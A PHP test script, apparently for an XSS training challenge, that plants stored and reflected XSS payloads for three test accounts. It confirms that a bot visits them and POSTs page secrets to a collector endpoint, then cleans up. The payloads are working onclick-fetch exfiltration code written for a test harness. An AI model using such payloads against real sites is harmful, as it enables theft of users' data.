<?php
declare(strict_types=1);
if (getenv('ORACLE_PERFORMANCE_TEST') !== '1') throw new RuntimeException('Use only the isolated performance project.');
require '/var/www/html/api/lib.php';
require '/var/www/html/challenge-auth.php';
require '/var/www/private/water-chain.php';
putenv('WATER_DATA=/var/www/challenge-data/water');
$water = water_chain_db();
$ids = array_map('intval', query("SELECT acc_id FROM Account WHERE username IN ('perf_0', 'perf_1', 'perf_2') ORDER BY acc_id")->fetchAll(PDO::FETCH_COLUMN));
if (count($ids) !== 3) throw new RuntimeException('Run performance-reads.php first.');
$marker = 'bot-smoke-' . bin2hex(random_bytes(5));
try {
    foreach ($ids as $id) {
        $collector = '/correnteza.php?drop=' . water_collection_token($id);
        $surfaceScript = 'fetch(' . json_encode($collector) . ', {method:"POST",body:' . json_encode($marker . ':surface:') . '+window.__MARES__.arquivo})';
        $depthScript = 'fetch(' . json_encode($collector) . ', {method:"POST",body:' . json_encode($marker . ':depth:') . '+JSON.stringify(window.__ARQUIVO__)})';
        $surface = '<button onclick="' . htmlspecialchars($surfaceScript, ENT_QUOTES) . '">Smoke</button>';
        $depth = '<button onclick="' . htmlspecialchars($depthScript, ENT_QUOTES) . '">Smoke</button>';
        $water->prepare('INSERT INTO reflexos (acct, corpo) VALUES (?, ?)')->execute([$id, $surface]);
        $water->prepare('INSERT INTO water_requests (acct, termo) VALUES (?, ?)')->execute([$id, $depth]);
    }
    $start = microtime(true);
    do {
        usleep(200000);
        $st = $water->prepare('SELECT acct, dado FROM correnteza WHERE dado LIKE ?');
        $st->execute([$marker . ':%']);
        $captures = $st->fetchAll();
    } while (count($captures) < 6 && microtime(true) - $start < 60);
    if (count($captures) !== 6) throw new RuntimeException('Bot did not execute all six XSS collectors: ' . count($captures));
    foreach ($ids as $id) {
        $rows = array_values(array_filter($captures, fn($row) => (int)$row['acct'] === $id));
        if (count($rows) !== 2) throw new RuntimeException('Bot mixed account collectors.');
        foreach ($rows as $row) {
            if (str_contains($row['dado'], ':surface:')) {
                if ($row['dado'] !== $marker . ':surface:/abismo.php?selo=' . water_entry_token($id)) throw new RuntimeException('Wrong surface seal.');
            } else {
                $receipt = json_decode(substr($row['dado'], strlen($marker . ':depth:')), true, 512, JSON_THROW_ON_ERROR);
                if ($receipt['mensagem'] !== challenge_water_message($id) || !water_valid_receipt($id, $receipt['recibo'])) throw new RuntimeException('Wrong depth message/receipt.');
            }
        }
    }
    printf("OK: real bot executed Stored/Reflected XSS for three isolated accounts (six visits), %.1f s.\n", microtime(true) - $start);
} finally {
    $water->prepare('DELETE FROM reflexos WHERE corpo LIKE ?')->execute(['%' . $marker . '%']);
    $water->prepare('DELETE FROM water_requests WHERE termo LIKE ?')->execute(['%' . $marker . '%']);
    $water->prepare('DELETE FROM correnteza WHERE dado LIKE ?')->execute([$marker . ':%']);
}
